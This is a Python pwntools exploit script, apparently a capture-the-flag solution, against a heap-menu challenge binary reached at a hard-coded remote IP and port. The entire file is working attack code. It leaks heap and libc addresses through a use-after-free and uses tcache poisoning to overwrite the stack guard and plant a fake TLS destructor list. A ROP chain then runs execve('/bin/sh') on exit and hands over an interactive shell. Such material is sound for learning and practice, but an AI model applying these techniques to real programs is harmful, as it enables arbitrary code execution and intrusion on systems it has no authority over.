#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 13339
HOST = "103.197.184.48"
exe = context.binary = ELF('./pwn5_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	brva 0x00000000000013F1
            brva 0x00000000000015FC
            brva 0x000000000000167D
            brva 0x00000000000014C5
        	# exit
        	brva 0x000000000000189E
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(idx, size, data = b'abcd'):
	p.sendlineafter(b'>> ', str(1))
	p.sendlineafter(b'number : ', str(idx))
	p.sendlineafter(b'(bytes) : ', str(size))
	p.sendafter(b'information : ', data)

def show(idx):
	p.sendlineafter(b'>> ', str(2))
	p.sendlineafter(b'number : ', str(idx))

def free(idx):
	p.sendlineafter(b'>> ', str(3))
	p.sendlineafter(b'number : ', str(idx))

def left_rotate(data, bit):
	return (data << bit) | (data >> (64 - bit))

# VARIABLE

# PAYLOAD
add(0, 0x100)
free(0)
show(0)
p.recvuntil(b'[0]:\n')
key = u64(p.recv(5) + b'\0'*3)
log.info("Key: " + hex(key))
heap_base = key << 12
log.info("Heap base: " + hex(heap_base))

for i in range(7):
	add(i, 0x100)
add(7, 0x100)
add(8, 0x100)
add(9, 0x18, b'/bin/sh')

for i in range(7):
	free(i)
free(8)
# Merge chunk
free(7)
add(6, 0x100)
free(8)
show(7)
p.recvuntil(b'[7]:\n')
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - 0x21ace0
log.info("Libc base: " + hex(libc.address))
system = libc.sym.system
bin_sh = next(libc.search(b'/bin/sh'))
pop_rdi = 0x000000000002a3e5 + libc.address
ret = pop_rdi + 1
mov_rsp_rdx = 0x000000000005a120 + libc.address
pop_rsi = 0x000000000002be51 + libc.address
pop_rdx_rbx = 0x00000000000904a9 + libc.address
pop_rax = 0x0000000000045eb0 + libc.address
syscall = 0x0000000000029db4 + libc.address

libc.sym.fs = libc.address - 0x28c0
log.info("Fs base: " + hex(libc.sym.fs))
stack_guard = libc.sym.fs + 0x30
payload = b'a'*0x108 + p64(0x111) + p64(key ^ stack_guard)
GDB()
add(0, 0x120, payload)
add(1, 0x100)
payload = p64(0) + b'4'*8
# Overwrite stack_guard
add(2, 0x100, payload)

# struct dtor_list
# {
#   dtor_func func;
#   void *obj;
#   struct link_map *map;
#   struct dtor_list *next;
# };
payload = flat(
	# fake_tls_dtor_list
	left_rotate(mov_rsp_rdx, 0x11), # rdx: heap_base + 0xc70
	0,
	0,
	heap_base + 0xc70, # -> execve('/bin/sh')
	pop_rax,
	0x3b,
	pop_rdi,
	bin_sh,
	pop_rsi,
	0,
	pop_rdx_rbx,
	0,
	0,
	syscall
	)
add(10, 0x4f8, payload)
add(11, 0x4f8)
fake_tls_dtor_list = heap_base + 0xc50
log.info("Fake tls dtor list: " + hex(fake_tls_dtor_list))
free(0)
free(1)

fs_base60 = libc.sym.fs - 0x60
payload = b'a'*0x108 + p64(0x111) + p64(key ^ fs_base60)
add(0, 0x120, payload)
add(1, 0x100)

# fs - 0x58 -> fake_tls_dtor_list
payload = b'6'*8 + p64(fake_tls_dtor_list)
add(2, 0x100, payload)

# exit -> __run_exit_handlers -> __call_tls_dtors
p.sendlineafter(b'>> ', str(4))

p.interactive()